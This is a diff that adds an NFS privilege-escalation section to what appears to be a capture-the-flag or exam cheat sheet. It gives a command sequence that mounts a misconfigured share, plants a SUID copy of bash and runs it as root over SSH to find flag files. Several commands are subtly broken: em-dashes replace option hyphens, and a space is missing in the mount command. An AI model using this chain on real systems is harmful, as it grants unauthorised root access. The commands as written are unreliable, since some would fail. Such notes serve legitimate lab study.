@@ -287,6 +287,30 @@ to checks hosts up: `nmap -sn IP/Subnet`
 
 * `nmap -Pn --script vuln <target_IP>`
 
+### Perform vertical privilege escalation of a root user, and enter the flag
+
+Exploiting misconfigured NFS (port 2049)
+
+* `nmap -sV —p 2049 IP/Subnet`
+* `sudo apt-get install nfs-common` (optional)
+* check available mounts: `showmount -e <Target_IP>`
+* `nmap -sV —script=nfs-showmount <Target_IP>`
+* `mkdir /tmp/nfs`
+* `sudo mount -t nfs <Target_IP>:/home/tmp/nfs`
+* `cd /tmp/nfs`
+* `sudo cp /bin/bash .`
+* `sudo chmod +s bash`
+* `ls -la`
+* `sudo df -h`
+
+after them, In another terminal:
+
+* Access to target using SSH
+* `./bash -p` and we're root!
+* `cd /home`
+* `ls -la`
+* Find the flag: `find / -name "*.txt" -ls 2> /dev/null`
+
 ## WireShark
 
 ### Which machine started DOS attack? DDOS attack happened on which IP? Find out http crediantls from PCAP file?&#x20;
